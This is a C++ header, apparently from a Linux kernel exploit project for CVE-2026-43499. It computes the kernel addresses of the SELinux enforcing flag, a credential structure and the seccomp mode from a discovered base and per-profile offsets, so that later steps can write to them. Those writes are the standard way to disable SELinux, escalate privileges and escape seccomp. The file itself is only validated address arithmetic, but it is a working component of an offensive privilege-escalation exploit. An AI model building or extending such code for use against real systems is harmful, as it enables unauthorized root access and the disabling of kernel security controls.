#pragma once
/** @file backend/cve_2026_43499/steps/targets.hpp
 *  The three field addresses a step set writes to, from a base and the profile's offsets.
 *
 *  A step target is an absolute address: the write lands at a word in the kernel's address space,
 *  and the offset the profile carries is measured from the base the discovery found. The retired
 *  tree did the same thing through one helper that added the two; this is that step written down
 *  where the step set can read it, and it does nothing else.
 *
 *  Nothing here invents a value. A base of zero, or an offset of zero, is refused rather than
 *  treated as a default, because a write at a guessed address is a write at whatever happens to be
 *  there. What the caller does with a refusal is its own business: this returns the answer and the
 *  caller names the step.
 */
#include <cstdint>

#include "backend/cve_2026_43499/steps/action.hpp"

namespace ghostlock::backend::cve_2026_43499::steps {
    /** The offsets the three addresses are measured from the base by. Zero is not a default. */
    struct FieldOffsets final {
        std::uint64_t selinux_enforcing = 0U;
        std::uint64_t credential = 0U;
        std::uint64_t seccomp_mode = 0U;
    };

    /** Why the addresses could not be built. */
    enum class TargetsVerdict : unsigned char {
        Ok = 0,
        /** The base or one of the offsets is zero, so an address would be a guess. */
        InputsInvalid = 1,
    };

    [[nodiscard]] constexpr const char *targets_verdict_name(TargetsVerdict verdict) noexcept {
        switch (verdict) {
            case TargetsVerdict::Ok: return "ok";
            case TargetsVerdict::InputsInvalid: return "param-invalid";
        }
        return "unknown";
    }

    /**
     *  The three addresses, base plus offset each.
     *
     *  @param base    The address the offsets are measured from, from the discovery.
     *  @param offsets The profile's three offsets.
     *  @param out     Filled only when every input is real; left untouched otherwise.
     *  @return        Ok, or InputsInvalid when any input is zero.
     */
    [[nodiscard]] constexpr TargetsVerdict step_targets_for(std::uint64_t base,
                                                            const FieldOffsets &offsets,
                                                            StepTargets &out) noexcept {
        if (base == 0U || offsets.selinux_enforcing == 0U || offsets.credential == 0U ||
            offsets.seccomp_mode == 0U) {
            return TargetsVerdict::InputsInvalid;
        }
        out.selinux_enforcing = static_cast<std::uintptr_t>(base + offsets.selinux_enforcing);
        out.credential = static_cast<std::uintptr_t>(base + offsets.credential);
        out.seccomp_mode = static_cast<std::uintptr_t>(base + offsets.seccomp_mode);
        return TargetsVerdict::Ok;
    }
}  // namespace ghostlock::backend::cve_2026_43499::steps
